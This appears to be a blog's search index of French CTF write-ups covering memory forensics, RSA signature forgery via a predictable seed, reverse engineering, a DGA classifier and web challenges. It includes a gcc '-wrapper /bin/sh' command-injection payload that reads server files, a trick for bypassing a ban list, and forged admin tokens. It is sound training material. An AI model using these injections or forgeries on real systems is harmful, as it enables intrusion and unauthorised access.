[{"categories":["writeup"],"content":"Forensic sous linux","date":"2024-04-02","objectID":"/posts/hsr2024/","tags":["android","reverse","forensic"],"title":"HackSecuReims 2024","uri":"/posts/hsr2024/"},{"categories":["writeup"],"content":"Forensic - Perte de mémoire Voici le lien contenant le dump et les profils à créer pour ce challenge. https://mega.nz/folder/MSNx2ATC#2t5MQ8pMD_Z7TN3-Ok4Fiw Nous avons, une fois téléchargé, un dump de la RAM d’une machine inconnue, ainsi qu’un PCAP. unxz dump.xz tar -xvf dump ","date":"2024-04-02","objectID":"/posts/hsr2024/:0:0","tags":["android","reverse","forensic"],"title":"HackSecuReims 2024","uri":"/posts/hsr2024/"},{"categories":["writeup"],"content":"Partie 1/6 L’outil phare pour l’analyse de RAM est le Framework volatility, que l’on installe: cd ~ git clone https://github.com/volatilityfoundation/volatility git clone https://github.com/volatilityfoundation/volatility3 https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet ","date":"2024-04-02","objectID":"/posts/hsr2024/:1:0","tags":["android","reverse","forensic"],"title":"HackSecuReims 2024","uri":"/posts/hsr2024/"},{"categories":["writeup"],"content":"Connaître le kernel On identifie tout d’abord l’OS sur lequel le dump a été effectué avec le plugin banners.Banners de vol3: python3 ~/volatility3/vol.py -f hsr2024.dmp banners.Banners Volatility 3 Framework 2.5.2 Progress: 100.00 PDB scanning finished Offset Banner 0x2256d578 Linux version 4.19.0-26-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.304-1 (2024-01-09) 0x23200180 Linux version 4.19.0-26-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.304-1 (2024-01-09) 0x23cc4314 Linux version 4.19.0-26-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.304-1 (2024-01-09) On peut également faire: strings openme.dmp | grep \"Linux version\" | sort | uniq Linux oblige, nous allons devoir construire un profil correspondant à ce kernel pour analyser le dump avec volatility. Voici le résumé de ce que nous allons faire et qui constitue sans doute la partie la plus difficile: https://andreafortuna.org/2019/08/22/how-to-generate-a-volatility-profile-for-a-linux-system/ ","date":"2024-04-02","objectID":"/posts/hsr2024/:1:1","tags":["android","reverse","forensic"],"title":"HackSecuReims 2024","uri":"/posts/hsr2024/"},{"categories":["writeup"],"content":"Installer les headers, symboles de debug et utilitaires Pour ne pas se tromper d’image, on recherche la version de Debian à partir du kernel: https://packages.debian.org/buster/linux-image-4.19.0-26-amd64 On crée alors une VM Virtualbox avec l’iso de Debian10: debian-10.13.0-amd64-netinst.iso: https://www.debian.org/releases/buster/debian-installer/ Notes d’installation: prévoir au moins 20G dans une partition stockage = controlleur SATA comprenant 1 vdi + 1 iso système = optique, disque dur + activer cache E/S + EFI (os spécial) + HyperV sudo apt install linux-headers-4.10.0-26-amd64 linux-image-4.10.0-26-amd64-dbg git build-essential dwarfdump make zip ","date":"2024-04-02","objectID":"/posts/hsr2024/:1:2","tags":["android","reverse","forensic"],"title":"HackSecuReims 2024","uri":"/posts/hsr2024/"},{"categories":["writeup"],"content":"Construire le profil avec vol2 git clone https://github.com/volatilityfoundation/volatility cd volatility/volatility/tools/linux make cd zip $(lsb_release -i -s)_$(uname -r)_profile.zip volatility/tools/linux/module.dwarf /usr/lib/debug/boot/System.map-4.19.0-26-amd64 # Si vol2 est installé dans la VM, sinon copier sur l'hôte cp Debian_4.19.0-26-amd64_profile.zip volatility/volatility/plugins/overlays/linux Attention, le profil crée se nommera LinuxDebian_4_19_0-26-amd64_profilex64, la plupart des plugins seront en linux_bash, linux_pslist etc. Pour retrouver le nom du profil: python2 ~/volatility/vol.py --info | grep Debian ","date":"2024-04-02","objectID":"/posts/hsr2024/:1:3","tags":["android","reverse","forensic"],"title":"HackSecuReims 2024","uri":"/posts/hsr2024/"},{"categories":["writeup"],"content":"Construire les symboles vol3 (pour la partie 3) Attention: avoir une RAM \u003e 5Go pour./dwarf2json sudo apt install golang git clone https://github.com/volatilityfoundation/dwarf2json cd dwarf2json/ go mod download github.com/spf13/pflag go build ./dwarf2json linux --elf /usr/lib/debug/vmlinux-4.19.0-26-amd64 \u003e ~/vmlinux-4.19.0-26-amd64.json ![](./virtualbox.png) # Si vol3 installé dans la VM, sinon copier sur l'hôte cp vmlinux-4.19.0-26-amd64.json volatility3/volatility3/symbols ","date":"2024-04-02","objectID":"/posts/hsr2024/:1:4","tags":["android","reverse","forensic"],"title":"HackSecuReims 2024","uri":"/posts/hsr2024/"},{"categories":["writeup"],"content":"Analyse avec vol2 (retour sur l’hôte) Nous pouvons maintenant utiliser les profils Linux. Commençons par l’historique de la machine. python2 ~/volatility/vol.py -f hsr2024.dmp --profile=LinuxDebian_4_19_0-26-amd64_profilex64 linux_bash Celle-ci a été mise à jour, a pingé 10.13.13.105 puis a déposé un ransomware depuis une clé dans /home/forensic/Documents. Passée la mesure anti strings, on observe également flag: echo -n \"RmxhZyBpcyA6IEhTUntNM20wcnlfRjByM25zMWNzX0FnYWluX0FnYWluXyZfQWdhaW59\" | base64 -d Flag is : HSR{M3m0ry_F0r3ns1cs_Again_Again_\u0026_Again} ","date":"2024-04-02","objectID":"/posts/hsr2024/:1:5","tags":["android","reverse","forensic"],"title":"HackSecuReims 2024","uri":"/posts/hsr2024/"},{"categories":["writeup"],"content":"Partie 2/6 Nous allons reconstruire l’arborescence du dump avec le plugin linux_recover_filesystem en root pour ne pas se soucier des permissions. mkdir fsystem sudo python ~/volatility/vol.py -f hsr2024.dmp --profile=LinuxDebian_4_19_0-26-amd64_profilex64 linux_recover_filesystem --dump-dir fsystem multi internal multi internal Recovered 20735 files sudo chown -R night:wheel fsystem cd fsystem/home/forensic/Documents/hsr ls flag.enc.b64 flag_01.png hsr_event ransomware.o On observe une image partiellement en clair ainsi qu’un texte: cat hsr_event | tr 'A-Za-z' 'N-ZA-Mn-za-m' HSR{Easy_fl4g_w1th_GeanY...} ","date":"2024-04-02","objectID":"/posts/hsr2024/:2:0","tags":["android","reverse","forensic"],"title":"HackSecuReims 2024","uri":"/posts/hsr2024/"},{"categories":["writeup"],"content":"Partie 3/6 Le challenge évoquait des fichiers chiffrés, on pense à l’image et à l’historique. On confirme au passage l’éxécution de GPG avec un autre plugin linux_pslist: python2 ~/volatility/vol.py -f hsr2024.dmp --profile=LinuxDebian_4_19_0-26-amd64_profilex64 linux_pslist | grep gpg Volatility Foundation Volatility Framework 2.6.1 0xffff893e36008000 gpg-agent 762 663 1000 1000 0x000000003a210000 2024-03-25 08:53:55 UTC+0000 0xffff893e3761bc00 gpg-agent 1374 1 0 0 0x00000000364be000 2024-03-25 09:34:55 UTC+0000 Attention: plugin vol3 (voir ./dwarf2json plus haut) nécessaire ici: Il nous faut alors un outil permettant de récupérer la clé GPG dans le dump afin de déchiffrer flag.enc. Avec une recherche Google: git clone 'https://github.com/kudelskisecurity/volatility-gpg' python3 ~/volatility3/vol.py -f hsr2024.dmp -p ~/volatility-gpg/ linux.gpg_full Volatility 3 Framework 2.5.2 Progress: 100.00 Stacking attempts finished Offset Private key Secret size Plaintext Searching from 31 Mar 2024 09:01:18 UTC to 04 Oct 2024 14:47:27 UTC Searching from 31 Mar 2024 09:01:44 UTC to 04 Oct 2024 14:47:27 UTC 0x7fc0cc0025a8 3b88f1a573a0a405e2fd60509c01c7d7 64 gs/5}554.Jk0iipqI4_c2jvrF\u0026|x?D 0x7fc0cc0025a8 3b88f1a573a0a405e2fd60509c01c7d7 64 gs/5}554.Jk0iipqI4_c2jvrF\u0026|x?D La clé obtenue permet de recouvrer le flag: ┌─[night@night-20b7s2ex01]─[~/hsr/forensics/fsystem/home/forensic/Documents/hsr] └──╼ 4 fichiers, 548Kb)─$ base64 -d flag.enc.b64 \u003e flag.enc ┌─[night@night-20b7s2ex01]─[~/hsr/forensics/fsystem/home/forensic/Documents/hsr] └──╼ 5 fichiers, 552Kb)─$ gpg -d flag.enc gpg: AES256.CFB encrypted data gpg: chiffré avec 1 phrase secrète Un flag tout simple à trouver et à rentrer pour avoir les points du CTF ;-) Le flag est : HSR{V0l@tility_w1th_GPG_1s_c00l_Again...in_2024} ","date":"2024-04-02","objectID":"/posts/hsr2024/:3:0","tags":["android","reverse","forensic"],"title":"HackSecuReims 2024","uri":"/posts/hsr2024/"},{"categories":["writeup"],"content":"Partie 4/6 D’après l’historique ransomware.o a ensuite été lancé sur la machine. Analysons le dans Ghidra, on remarque une fonction decrypt_master qui fait un xor entre une section mémoire et un short: undefined8 main(void) { undefined2 local_12; undefined8 local_10; puts(\"[\u003e] 3vil-kevin ransomware 0.0.1-dev\"); puts(\"[\u003e] Enter 16-bit military grade cryptographic key :\"); __isoc99_scanf(\u0026DAT_00102064,\u0026local_12); puts(\"[+] Decrypting master key...\"); local_10 = decrypt_master(local_12); printf(\"!! TODO ENCRYPT FILE WITH %s\\n\",local_10); return 0; } En supposant que la section mémoire déchiffrée soit le flag, nous avons cependant un clair connu(HSR{). En sortant le chiffré et en écrivant un court script python, on obtient le flag: from itertools import cycle cipher=\"989982b1a8faa295e1b98fade0fab49593b8a9baa4fa8fa5a2959efaa4b7\" key=\"HSR{\" cipher = bytes.fromhex(cipher) cipher = [b for b in cipher] key = [ord(c) for c in key] plain_key = [ t[0]^t[1] for t in zip(cipher,key)] key = [chr(x) for x in plain_key] for i in range(len(key),len(cipher)): plain_key.append(plain_key[i%len(key)]) plain = [t[0]^t[1] for t in zip(cipher,plain_key)] plain = [chr(x) for x in plain] print(''.join(plain)) Flag: HSR{x0r_1s_g00d_Crypt0_or_N0t} ","date":"2024-04-02","objectID":"/posts/hsr2024/:4:0","tags":["android","reverse","forensic"],"title":"HackSecuReims 2024","uri":"/posts/hsr2024/"},{"categories":["writeup"],"content":"Parties 5/6 (Avec PCAP) Non terminé, on remarque: un échange entre 10.13.13.104 et 10.13.13.109 dans le PCAP une connection SSH à ssh hsr@10.13.13.104 et ssh hsr@10.13.13.105 python ~/volatility/vol.py -f hsr2024.dmp --profile=LinuxDebian_4_19_0-26-amd64_profilex64 linux_netstat ... TCP 10.13.13.109 :49114 10.13.13.104 : 22 ESTABLISHED ssh/1335 Voici comment terminer les parties 5 et 6 avec 1 autre plugin vol2, https://or1on-ctf.github.io/2021/07/27/HTB-Business-CTF-Compromise.html Avec le port 1335 que l’on vient de remarquer, on lance linux_sshkeys: git clone https://github.com/fox-it/OpenSSH-Session-Key-Recovery cp ~/OpenSSH-Session-Key-Recovery/volatility2/openssh_sessionkeys.py ~/volatility/contrib/plugins/ python ~/volatility/vol.py -f hsr2024.dmp --profile=LinuxDebian_4_19_0-26-amd64_profilex64 linux_sshkeys -p 1335 Scanning for OpenSSH sshenc structures... Name Pid PPid Address Name Key IV ------------------------------ -------- -------- ------------------ ------------------------------ -------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------------------------------- ssh [ssh hsr@10.13.13.104] 1335 999 0x00005595fe1d1dc0 aes256-gcm@openssh.com 0cfcce93342a2c43bd05e8f296bb7b4a61a734c3b274eb765017523269443d2b 64b7a25d5def09e22494242a ssh [ssh hsr@10.13.13.104] 1335 999 0x00005595fe1d1ea0 aes256-gcm@openssh.com 955f60ba9b171179f584b91e1acd20666859826c5977ec56490553ed29d0ee72 On crée le JSON comme indiqué pour le second outil (https://github.com/fox-it/OpenSSH-Network-Parser): { \"task_name\": \"sshd\", \"sshenc_addr\": 94102701809088, \"cipher_name\": \"aes256-gcm@openssh.com\", \"key\": \"0cfcce93342a2c43bd05e8f296bb7b4a61a734c3b274eb765017523269443d2b\", \"iv\": \"64b7a25d5def09e22494242a\" } { \"task_name\": \"sshd\", \"sshenc_addr\": 94102701809312, \"cipher_name\": \"aes256-gcm@openssh.com\", \"key\": \"955f60ba9b171179f584b91e1acd20666859826c5977ec56490553ed29d0ee72\", \"iv\": \"1f4146c82cabf3010ec680de\" } Pour fix l’outil (CTRL+F pynids) https://scribe.rip/@kevintk1/htb-business-ctf-2021-forensic-compromised-1aa265b843a6: git clone https://github.com/fox-it/OpenSSH-Network-Parser \u0026\u0026 cd OpenSSH-Network-Parser/openssh_network_parser Comme indiqué, creer un virtualenv python2: pyenv local 2.7 pyenv virtualenv venv pyenv activate venv pip install psutil tabulate gevent libnacl cryptography Puis install manuellement pynids: git clone https://github.com/MITRECND/pynids \u0026\u0026 cd pynids tar -xvf lib*gz \u0026\u0026 rm -f *gz \u0026\u0026 cd libnids* mkdir build \u0026\u0026 cd build ../configure make cp src/libnids.a ../src cd ../../dist tar -xvf *gz \u0026\u0026 rm -f *gz \u0026\u0026 cd pynids* python setup.py install De retour pour l’outil principal (network ssh): cd ../../../.. python2 setup.py install Enfin , de retour dans le répertoire du dump cd ~/hsr/forensics pyenv local 2.7.18/envs/venv #CTRL+D, CTRL+ALT+T mkdir ssh-traffic network-parser -p hsr2024.pcap --popt keyfile=keys.json --proto ssh -o ssh-traffic/ ","date":"2024-04-02","objectID":"/posts/hsr2024/:5:0","tags":["android","reverse","forensic"],"title":"HackSecuReims 2024","uri":"/posts/hsr2024/"},{"categories":["writeup"],"content":"Quelques challenges simples","date":"2024-03-04","objectID":"/posts/gcc-ctf/","tags":["android","crypto","reverse","machine learning","misc","web"],"title":"GCC 2024- Quelques writeups","uri":"/posts/gcc-ctf/"},{"categories":["writeup"],"content":"Introduction Remarque Tous les challenges et solutions sont disponibles ici: https://github.com/GCC-ENSIBS/GCC-CTF-2024 ! Voici quelques notes sur certains challenges résolus ou étudiés par mon équipe. Nous n’étions pas particulièrement disponibles, et séchions sur certaines catégories (osint,web3,pwn), cependant les défis étaient originaux , de qualité et comprenaient souvent plusieurs solutions non prévues par les auteurs. Finalement, nous avons pu obtenir un classement respectable (~15%) en nous focalisant sur nos domaines de préférences. ","date":"2024-03-04","objectID":"/posts/gcc-ctf/:1:0","tags":["android","crypto","reverse","machine learning","misc","web"],"title":"GCC 2024- Quelques writeups","uri":"/posts/gcc-ctf/"},{"categories":["writeup"],"content":"Crypto ","date":"2024-03-04","objectID":"/posts/gcc-ctf/:2:0","tags":["android","crypto","reverse","machine learning","misc","web"],"title":"GCC 2024- Quelques writeups","uri":"/posts/gcc-ctf/"},{"categories":["writeup"],"content":"GCC News Signature Le but de ce challenge est d’accéder à la page /news du site une fois connecté. Une fois notre utilisateur a crée, nous disposons d’un token et d’un message passés en GET pour cette route: http://worker04.gcc-ctf.com:14307/news?token=9[...]03\u0026message=eydhJzogW0ZhbHNlXX0%3D, avec echo -ne eydhJzogW0ZhbHNlXX0= | base64 -d {'a': [False]}base64: entrée incorrecte Le message étant formatté en JSON {'utilisateur': [False]}, on se doute qu’un parseur vérifiera si la valeur associée au nom utilisateur vaut True mais il faut générer un token valide pour ce message. Regardons le code source d’un peu plus près: @app.route('/news', methods=['GET']) def news(): signature = request.args.get('token') message = base64.b64decode(request.args.get('message')).decode() message = json.loads(message.replace(\"'\", '\"').replace(\"False\", \"false\").replace(\"True\", \"true\")) username = list(message.keys())[0] subscribe = list(message.values())[0][0] if signature: is_sign = verify_signature(str(message), public_key_users[username], signature) if is_sign: return render_template('news.html', username=username, subscribe=subscribe) return redirect(url_for('login', reason='unauthorized')) Notre token est en fait une signature RSA, dont les clés publiques et privées sont générées à partir du message, que l’on contrôle et qui semble unique (pas de SGBD pour stocker les tokens) … Pour rappel, en notant (n,e) la clé publique, (n,d) la clé privée et s la signature: $$s = m^{d}[n]$$ C’est exactement le travail de verify_signature. Mais comment fonctionne generate_key(username)? Utilisation d’un PRNG Le module n est en fait crée à partir d’une décomposition en facteurs premiers, puis l’indicatrice d’Euler ainsi que la clé privée en sont déduites. Comme on s’en doutait, chaque paire de clés ne dépendant que du paramètre username, la faille réside dans la génération de ces facteurs. En effet le module random est utilisé comme PRNG pour initialiser la seed (graine) générant ces facteurs: s = bytes_to_long(username.encode()) # username controlled random.seed(s) # predictable seed while math.gcd(phi,e) != 1: n = 1 factors = [] while length(n) \u003c 2048: temp_n = random.getrandbits(48) # deterministic factors if isPrime(temp_n): n *= temp_n factors.append(temp_n) phi = 1 for f in factors: phi *= (f - 1) Pour plus d’information sur PRNG-RSA, voir https://www.0x0ff.info/2014/prng-et-generateur-de-cle/ . Grossièrement, il suffira de réutiliser la génération de clés qui nous sont fournies: from app import * (n,e), (n,d) = generate_key('admin') message = str({'admin': [True]});print(message) hashed_message = hash_string_sha256(message) signature = pow(hashed_message,d,n); print(signature) Il ne reste plus qu’à accéder à /news avec ces paramètres : http://worker04.gcc-ctf.com:14307/news?token=[signature]03\u0026message=[message] ","date":"2024-03-04","objectID":"/posts/gcc-ctf/:2:1","tags":["android","crypto","reverse","machine learning","misc","web"],"title":"GCC 2024- Quelques writeups","uri":"/posts/gcc-ctf/"},{"categories":["writeup"],"content":"Reverse ","date":"2024-03-04","objectID":"/posts/gcc-ctf/:3:0","tags":["android","crypto","reverse","machine learning","misc","web"],"title":"GCC 2024- Quelques writeups","uri":"/posts/gcc-ctf/"},{"categories":["writeup"],"content":"Ransom D’après l’énonce, nous disposons d’un binaire ransom étrange, chiffrant un certain fichier en secret.txt.enc sur une machine Debian: file ransom ransom: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped En éxécutant ce binaire, le contenu de secret.txt, s’il existe est chiffré dans secrets.txt.enc. Pour s’en apercevoir, il est préférable de débugger le programme avec GDB, ou de tracer les appels systèmes: strace ./ransom execve(\"./ransom\", [\"./ransom\"], 0x7ffeffec1480 /* 64 vars */) = 0 [ Process PID=230712 runs in 32 bit mode. ] strace: WARNING: Proper structure decoding for this personality is not supported, please consider building strace with mpers support enabled. open(\"secrets.txt\", O_RDONLY) = -1 ENOENT (Aucun fichier ou dossier de ce nom) read(-2, 0x804a1a2, 1024) = -1 EBADF (Mauvais descripteur de fichier) close(-2) = -1 EBADF (Mauvais descripteur de fichier) uname({sysname=\"Linux\", nodename=\"night-20b7s2ex01\", ...}) = 0 creat(\"secrets.txt.enc\", 0666) = 3 write(3, \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\", 18) = 18 close(3) = 0 exit(0) = ? +++ exited with 0 +++ Nous avons donc affaire à un keygen en assembleur x86 comme l’indique le challenge. En 32 bits, plusieurs conventions d’appel existent, ici le ret est fait dans eax puis le syscall correspondant est effectué avec int 80, dans la convention FASTCALL. Afin de faire un peu d’analyse statique, on peut penser à Ghidra, plutôt efficace pour traiter du C ainsi que diverses architectures (ARM,MIPS) mais seules 2 des 4 fonctions présentes seront décompilées, en plus de noter les syscall avec swi (ARM) sans plus de détail. Binary Ninja facilite alors le travail: En s’armant de documentation (https://x86.syscall.sh/), on comprend que la longue suite de inc eax dans la fin du premier bloc correspond au uname (syscall 0x7a=122), puis que le mot de passe secret_content lu et stocké dans esi en 0x0804903c puis stocké dans eax en 0x080490c9 subit une comparaison et un xor: En affichant la valeur contenue à l’addresse de data_804a05d, on se rend compte qu’il s’agit du résultat du uname appliqué sur notre machine. Nous allons donc reverser cet algorithme grâce à cette clé, connaissant le format du flag: import string def dechiffre_vigenere(texte_chiffre, cle): cle_int = [ord(c) for c in cle] dechiffre_texte = \"\" for i, char in enumerate(texte_chiffre): val_char = ord(char) val_dechiffre = (val_char - 1) ^ cle_int[i % len(cle)] dechiffre_texte += chr(val_dechiffre \u0026 0xFF) return dechiffre_texte msg = '$\\'\"\\x133`*6/[?_\\'$8IA\\x14' won = dechiffre_vigenere(msg,\"GCC{\")[:4] assert(won == \"debi\") key = won + \"a\" flag = \"\" for c in string.printable: r = dechiffre_vigenere(msg,key+c) if r.startswith(\"GCC{\") and r.endswith(\"}\"): flag+=r print(flag) ou, en devinant la clé, d’après l’énoncé et notre analyse sur le hostname: from pwn import xor key = b\"debian\" min_1_secrets = [] with open(\"secrets.txt.enc\", \"rb\") as secrets_file: secrets = secrets_file.read() for c in secrets: min_1_secrets.append(c - 1) print(xor(min_1_secrets, key)) ","date":"2024-03-04","objectID":"/posts/gcc-ctf/:3:1","tags":["android","crypto","reverse","machine learning","misc","web"],"title":"GCC 2024- Quelques writeups","uri":"/posts/gcc-ctf/"},{"categories":["writeup"],"content":"GCC Chat 1 Analyse statique On dispose d’un fichier GCC_Chat.apk. Étudions son conde source avec JADX. Dans, AndroidManifest.xml on constate que MainActivity est directement lancée avec l’intent LAUNCHER. \u003cactivity android:theme=\"@style/Theme.App.SplashScreen\" android:name=\"com.aloxos.gccchat.MainActivity\" android:exported=\"true\" android:launchMode=\"singleTask\" android:screenOrientation=\"portrait\" android:configChanges=\"screenSize|uiMode|screenLayout|orientation|keyboardHidden|keyboard\" android:windowSoftInputMode=\"adjustResize\"\u003e \u003cintent-filter\u003e \u003caction android:name=\"android.intent.action.MAIN\"/\u003e \u003ccategory android:name=\"android.intent.category.LAUNCHER\"/\u003e \u003c/intent-filter\u003e \u003cintent-filter\u003e \u003caction android:name=\"android.intent.action.VIEW\"/\u003e \u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e \u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e \u003cdata android:scheme=\"com.aloxos.gccchat\"/\u003e \u003c/intent-filter\u003e \u003c/activity\u003e On repère également d’autres classes associées à React et Expo. On clique alors sur le MainActivity qui hérite de la classe abstraite ReactActivity: En effectuant Find Usage(x) sur onCreate, on remarque en effet une définition de Bundle() dans ComponentActivity: D’autre part on pourrait remarquer l’import de android.os.Bundle , également présent dans le bytecode Kotlin. Beaucoup de bibliothèques dynamiques sont présentes , à ce stade on peut lancer l’application dans Android Studio On peut aussi chercher quelques strings relatives à l’erreur de connection dans: ressources/ressources.arsc/res/values/strings.xml ressources/res/layout Ce qui n’est pas concluant. On peut aussi perdre beaucoup de temps à inspecter le code les bibliothèques dynamiques dans Ghidra, mais cela ne mène à rien. Reverse du bytecode Hermes Si on n’avait pas prêté attention au Bundle, on peut alors effectuer un grep dans les ressources statiques: grep -r \"Wrong username\" grep: resources/assets/index.android.bundle : fichiers binaires correspondent Intéressant: file resources/assets/index.android.bundle resources/assets/index.android.bundle: Hermes JavaScript bytecode, version 96 Avec google, on tombe rapidement sur l’outil hbctool, qui doit être patché pour supporter la version du bytecode: hbctool disasm index.android.bundle . [*] Disassemble 'index.android.bundle' to '.' path Traceback (most recent call last): File \"/home/.local/bin/hbctool\", line 8, in \u003cmodule\u003e sys.exit(main()) ^^^^^^ File \"/home/.local/lib/python3.11/site-packages/hbctool/__init__.py\", line 61, in main disasm(args['\u003cHBC_FILE\u003e'], args['\u003cHASM_PATH\u003e']) File \"/home/night/.local/lib/python3.11/site-packages/hbctool/__init__.py\", line 33, in disasm hbco = hbc.load(f) ^^^^^^^^^^^ File \"/home/.local/lib/python3.11/site-packages/hbctool/hbc/__init__.py\", line 29, in load assert version in HBC, f\"The HBC version ({version}) is not supported.\" ^^^^^^^^^^^^^^ AssertionError: The HBC version (96) is not supported. Après coup, on aurait pu utiliser hermes-dec: hbc-decompiler index.android.bundle | less #/Wrong username Qui permet de produire un assembleur de la fonction de Login: r13 = function() { // Original name: handleLogin, environment: r13 _fun6460: for(var _fun6460_ip = 0; ; ) switch(_fun6460_ip) { case 0: r2 = _closure2_slot1; r1 = 'GCC_Staff'; if(!(r2 === r1)) { _fun6460_ip = 27; continue _fun6460 } case 15: r2 = _closure2_slot4; r1 = '011efea0cac926232add733f86e3d9f6ab53c237be9e40f9e6a2e255ba33abc3'; if(!(r2 !== r1)) { _fun6460_ip = 48; continue _fun6460 } case 27: r1 = global; r3 = r1.alert; r2 = undefined; r1 = 'Wrong username or password'; r1 = r3.bind(r2)(r1); _fun6460_ip = 67; continue _fun6460; case 48: r2 = _closure2_slot0; r1 = r2.navigate; r0 = 'Main'; r0 = r1.bind(r2)(r0); case 67: r0 = undefined; return r0; } }; Les identifiants sont donc GCC_Staff et P4ssw0rd, ce qui permet de valider la première partie. ","date":"2024-03-04","objectID":"/posts/gcc-ctf/:3:2","tags":["android","crypto","reverse","machine learning","misc","web"],"title":"GCC 2024- Quelques writeups","uri":"/posts/gcc-ctf/"},{"categories":["writeup"],"content":"Misc ","date":"2024-03-04","objectID":"/posts/gcc-ctf/:4:0","tags":["android","crypto","reverse","machine learning","misc","web"],"title":"GCC 2024- Quelques writeups","uri":"/posts/gcc-ctf/"},{"categories":["writeup"],"content":"DGA Le nom du challenge faisait référence aux algorithmes de génération de noms de domaines, ayant souvent pour but de cacher la communication entre une machine infectée par un logiciel Command \u0026 Control et le serveur de l’attaquant. Ici nous disposons d’une liste d’url valides et d’une liste malveillante afin de pouvoir entraîner un modèle devant classifier en temps réel avec un taux de réussite de plus de 85%, via un service TCP. Un collègue ayant résolu ce challenge, je vous propose un writeup qualitatif d’un joueur du CTF pour plus de détails https://nathan-out.github.io). Voici donc une forme de notre modèle: import numpy as np import pandas as pd from pandas import DataFrame from sklearn.model_selection import train_test_split from sklearn.tree import DecisionTreeClassifier from sklearn.metrics import accuracy_score legit_dataframe = pd.read_csv(\"dataset_legit.txt\", header=0) legit_dataframe['class'] = 'legit' X = all_domains[['length', 'entropy', 'legit_websites_tfidf', 'eng_word_tfidf']] y = np.array(all_domains['class'].tolist()) X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2) #20% pour test, 80% pour entraînement model = DecisionTreeClassifier() model.fit(X_train, y_train) # entraînement avec les données d'entraînement predictions = model.predict(X_test) # prédiction sur les données de test accuracy = accuracy_score(y_test, predictions) # calcul de la précision par rapport au prédictions print(\"Exactitude (Accuracy) :\", accuracy) Pour optimiser la détection, on peut supprimer de notre liste les prédictions extrêmes: def outlier_thresholds(dataframe, col_name, q1=0.20, q3=0.80): quartile1 = dataframe[col_name].quantile(q1) quartile3 = dataframe[col_name].quantile(q3) interquantile_range = quartile3 - quartile1 up_limit = quartile3 + 1.5 * interquantile_range low_limit = quartile1 - 1.5 * interquantile_range return low_limit, up_limit def remove_outlier(dataframe, col_name): low_limit, up_limit = outlier_thresholds(dataframe, col_name) df_without_outliers = dataframe[~((dataframe[col_name] \u003c= low_limit) | (dataframe[col_name] \u003e= up_limit))] return df_without_outliers Il ne reste plus qu’à utiliser notre modèle sur le service fourni: GCC{M4ch1n3_L34rn1ng_15_v3ry_g00d_4t_d3t3ct1ng_m4l1c10us_4ct1v135} Crédits : https://www.elastic.co/fr/blog/supervised-and-unsupervised-machine-learning-for-dga-detection https://nathan-out.github.io/posts/ml-x-cybersecurite-analyse-url/ https://www.kaggle.com/code/omurcantatar/domain-generation-algorithm-dga-detection/notebook ","date":"2024-03-04","objectID":"/posts/gcc-ctf/:4:1","tags":["android","crypto","reverse","machine learning","misc","web"],"title":"GCC 2024- Quelques writeups","uri":"/posts/gcc-ctf/"},{"categories":["writeup"],"content":"GCC Online Le challenge se présente sous la forme d’une page web permettant de compiler un code C en donnant le choix de définir des flags de compilation ainsi que des variables d’environnement. Le binaire généré étant tout à fait classique, il faudra donc opérer à la compilation. Grâce à un coéquipier, on s’arme rapidement de GTFOBins afin d’éxécuter des commandes sur le serveur. En guise de test, on peut penser à lire /etc/passwd, ce qui échoue: Toutefois, en pensant à adapter le premier payload ouvrant un shell, on constate que -wrapper n’est pas correctement filtré: On peut donc effectuer un pwd et constater que l’application Flask lancée par __init__.py filtre les options à bannir et vérifie que leur syntaxe est correcte: Compilation Error. Traceback (most recent call last): File \"/data/app/__init__.py\", line 77, in compile_code with open(file_name[:-2], 'rb') as binary_file: ^^^^^^^^^^^^^^^^^^^^^^^^^^ FileNotFoundError: [Errno 2] No such file or directory: '/tmp/2d345033d3dbcc23bc368b36d46a4ef47b9c41a42f5965fa7d57bd697b60ae44' Output: 15e94765365729ab9599cd8ba2a4634aa8bcd9ec3961daf633f611d9f575a48b app flag-d66f8a09eb837545e857994ab28a3ed635d5c4c7c7caa710d28111a536b42422.txt requirements.txt venv Il ne reste plus qu’à afficher le flag, en fournissant en argument: gcc main.c -wrapper /bin/sh,-s,-c,cat${IFS}/data/flag-d66f8a09eb837545e857994ab28a3ed635d5c4c7c7caa710d28111a536b42422.txt Notes: Le fichier banlist.txt devait empêcher de fournir les arguments suivants avant sa suppression: -wrapper -E -B -o –output La solution attendue était de lire le code source de __init__.py -x c /data/app/__init__.py puis de supprimer cette liste avant de réutiliser -wrapper: -Xlinker -o/data/15e94765365729ab9599cd8ba2a4634aa8bcd9ec3961daf633f611d9f575a48b/banlist.txt ","date":"2024-03-04","objectID":"/posts/gcc-ctf/:4:2","tags":["android","crypto","reverse","machine learning","misc","web"],"title":"GCC 2024- Quelques writeups","uri":"/posts/gcc-ctf/"},{"categories":["writeup"],"content":"Web Remarque: Ces challenges étants résolus par un coéquipier, les exploitations ont été refaites avec les Dockerfile fournis (voir Introduction) ","date":"2024-03-04","objectID":"/posts/gcc-ctf/:5:0","tags":["android","crypto","reverse","machine learning","misc","web"],"title":"GCC 2024- Quelques writeups","uri":"/posts/gcc-ctf/"},{"categories":["writeup"],"content":"Free Cider IDOR Une feature de réinitialisation du mdp est présente, mais il ne semble pas y avoir d’injections triviales ds ces champs. On remarque un cookie de session flask qui ne semble pas vulnérable: flask-unsign --decode --cookie eyJub25jZSI6IjYzYzkyNmQwZTM3MzNhMDllOWNhMTM0YjJhZjg1NjhiIn0.ZefV6w.Jgbf49cZlIxFytdhbjyZH97HoQY {'nonce': '63c926d0e3733a09e9ca134b2af8568b'} Le fuzzing était possible mais semblait compromis à cause d’un un rate limiting. En revanche, le code source fait référence à un Swagger: \u003c!-- Note for admins : For the sake of security, remove the bloody swagger UI from the production build. --\u003e On se doute qu’il existe une API Swagger, souvent reliée à /api/v1/swagger.json, ce qui est le cas ici: L’API Restful comporte 